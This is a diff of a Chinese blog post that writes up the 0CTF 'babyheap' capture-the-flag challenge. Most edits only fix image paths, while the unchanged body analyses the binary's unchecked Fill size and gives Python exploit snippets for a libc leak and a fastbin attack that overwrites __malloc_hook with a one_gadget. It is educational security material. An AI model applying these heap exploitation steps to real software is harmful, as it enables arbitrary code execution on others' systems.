@@ -53,18 +53,18 @@
 <meta property="og:site_name" content="Coldshiel&#39;s blog">
 <meta property="og:description" content="0ctfbabyheap寒假肝堆得加紧了，还想刷pwnable来着 程序分析 程序主要分为四个功能：Allocate,Fill,Free,Dump Allocate： 依次按照下标分配，最多为16个chunk，首先判断是否为using chunk，输入size后最大为0x1000，使用calloc分配空间（相较于malloc函数，calloc函数会自动将内存初始化为0）然后更新记录结构体的FL">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://yoursite.com/2020/01/29/0ctfbabyheap/0ctfbabyheap%5C1580313525795.png">
-<meta property="og:image" content="http://yoursite.com/2020/01/29/0ctfbabyheap/0ctfbabyheap%5C1580113992227.png">
-<meta property="og:image" content="http://yoursite.com/2020/01/29/0ctfbabyheap/0ctfbabyheap%5C1580114274572.png">
-<meta property="og:image" content="http://yoursite.com/2020/01/29/0ctfbabyheap/0ctfbabyheap%5C1580114435473.png">
-<meta property="og:image" content="http://yoursite.com/2020/01/29/0ctfbabyheap/0ctfbabyheap%5C1580115008365.png">
-<meta property="og:image" content="http://yoursite.com/2020/01/29/0ctfbabyheap/0ctfbabyheap%5C1580295721778.png">
-<meta property="og:image" content="http://yoursite.com/2020/01/29/0ctfbabyheap/0ctfbabyheap%5C1580296367287.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/29/0ctfbabyheap/1580313525795.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/29/0ctfbabyheap/1580113992227.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/29/0ctfbabyheap/1580114274572.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/29/0ctfbabyheap/1580114435473.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/29/0ctfbabyheap/1580115008365.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/29/0ctfbabyheap/1580295721778.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/29/0ctfbabyheap/1580296367287.png">
 <meta property="article:published_time" content="2020-01-29T16:12:29.000Z">
-<meta property="article:modified_time" content="2020-01-29T16:25:28.148Z">
+<meta property="article:modified_time" content="2020-01-29T16:36:35.987Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/2020/01/29/0ctfbabyheap/0ctfbabyheap%5C1580313525795.png">
+<meta name="twitter:image" content="http://yoursite.com/2020/01/29/0ctfbabyheap/1580313525795.png">
 
 <link rel="canonical" href="http://yoursite.com/2020/01/29/0ctfbabyheap/">
 
@@ -201,7 +201,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-01-29 08:12:29 / Modified: 08:25:28" itemprop="dateCreated datePublished" datetime="2020-01-29T08:12:29-08:00">2020-01-29</time>
+              <time title="Created: 2020-01-29 08:12:29 / Modified: 08:36:35" itemprop="dateCreated datePublished" datetime="2020-01-29T08:12:29-08:00">2020-01-29</time>
             </span>
 
           
@@ -218,15 +218,15 @@
         <hr>
 <hr>
 <h1 id="0ctfbabyheap"><a href="#0ctfbabyheap" class="headerlink" title="0ctfbabyheap"></a>0ctfbabyheap</h1><p>寒假肝堆得加紧了，还想刷pwnable来着</p>
-<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p><img src="/2020/01/29/0ctfbabyheap/0ctfbabyheap%5C1580313525795.png" alt="1580313525795"></p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p><img src="/2020/01/29/0ctfbabyheap/1580313525795.png" alt="1580313525795"></p>
 <p>程序主要分为四个功能：Allocate,Fill,Free,Dump</p>
-<h3 id="Allocate："><a href="#Allocate：" class="headerlink" title="Allocate："></a>Allocate：</h3><p><img src="/2020/01/29/0ctfbabyheap/0ctfbabyheap%5C1580113992227.png" alt="1580113992227"></p>
+<h3 id="Allocate："><a href="#Allocate：" class="headerlink" title="Allocate："></a>Allocate：</h3><p><img src="/2020/01/29/0ctfbabyheap/1580113992227.png" alt="1580113992227"></p>
 <p>依次按照下标分配，最多为16个chunk，首先判断是否为using chunk，输入size后最大为0x1000，使用calloc分配空间（相较于malloc函数，calloc函数会自动将内存初始化为0）然后更新记录结构体的FLAG、size，content_ptr</p>
-<h3 id="Fill："><a href="#Fill：" class="headerlink" title="Fill："></a>Fill：</h3><p><img src="/2020/01/29/0ctfbabyheap/0ctfbabyheap%5C1580114274572.png" alt="1580114274572"></p>
+<h3 id="Fill："><a href="#Fill：" class="headerlink" title="Fill："></a>Fill：</h3><p><img src="/2020/01/29/0ctfbabyheap/1580114274572.png" alt="1580114274572"></p>
 <p>输入下标后判断下标是否在范围内，然后判断对应下标的记录结构体FLAG位是否是1（using or not），然后输入size，判断size是否大于0，然后直接输入，<strong>此处并未做输入大小检查</strong></p>
-<h3 id="Free："><a href="#Free：" class="headerlink" title="Free："></a>Free：</h3><p><img src="/2020/01/29/0ctfbabyheap/0ctfbabyheap%5C1580114435473.png" alt="1580114435473"></p>
+<h3 id="Free："><a href="#Free：" class="headerlink" title="Free："></a>Free：</h3><p><img src="/2020/01/29/0ctfbabyheap/1580114435473.png" alt="1580114435473"></p>
 <p>输入下标，判断是否在范围内，然后判断using or not，接着置记录结构体FLAG位为0，size为0，然后free掉content_ptr指针并置零</p>
-<h3 id="Dump："><a href="#Dump：" class="headerlink" title="Dump："></a>Dump：</h3><p><img src="/2020/01/29/0ctfbabyheap/0ctfbabyheap%5C1580115008365.png" alt="1580115008365"></p>
+<h3 id="Dump："><a href="#Dump：" class="headerlink" title="Dump："></a>Dump：</h3><p><img src="/2020/01/29/0ctfbabyheap/1580115008365.png" alt="1580115008365"></p>
 <p>输入下标后判断是否在范围内，判断using or not，然后按记录的size打印内容</p>
 <h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit:"></a>Exploit:</h2><p>多calloc几个chunk之后可以利用Fill的漏洞修改相邻chunk的size还有内容</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#index 0 chunk 0</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#index 1 chunk 1</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#index 2 chunk 2</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#index 3 chunk 3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#index 4 chunk 4 Small chunk</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#index 5 Avoid merging into top_chunk</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
@@ -243,10 +243,10 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>]) - <span class="number">0x3c4b78</span> <span class="comment">#The offset of main_arena+... in libc</span></span><br></pre></td></tr></table></figure>
 
 <p>此时可想办法利用__malloc_hook，将one_gadget填入，当__malloc_hook不为0时即可调用</p>
-<p><img src="/2020/01/29/0ctfbabyheap/0ctfbabyheap%5C1580295721778.png" alt="1580295721778"></p>
+<p><img src="/2020/01/29/0ctfbabyheap/1580295721778.png" alt="1580295721778"></p>
 <p>由于index 2此时指向的依然是chunk 4，我们可以对free掉的chunk 4的fd做修改，再次利用fastbin attack申请到一个包含<em>\</em>malloc_hook的堆块，不过此时要缩小其大小，让chunk 4的size在fast chunk之内</p>
 <p>利用fastbin attack申请一个包含<em>\</em>malloc_hook的堆块需要对应的地方有合适的size</p>
-<p><img src="/2020/01/29/0ctfbabyheap/0ctfbabyheap%5C1580296367287.png" alt="1580296367287"></p>
+<p><img src="/2020/01/29/0ctfbabyheap/1580296367287.png" alt="1580296367287"></p>
 <p>当偏移加上0xd之后，利用此处的0x7f size来构造一个chunk，所以我们要将free后在usorted bin中的chunk 4分割，calloc(0x60)然后free之后即可利用chunk 3来修改其fd</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#0x80----&gt;0x70</span></span><br><span class="line">free(<span class="number">4</span>)     <span class="comment">#Set chunk to fastbin</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">2</span>, p64(libc_base + <span class="number">0x3c4aed</span>)) <span class="comment">#Fastbin attack target</span></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#index 4</span></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#index 6 get our target</span></span><br></pre></td></tr></table></figure>
 
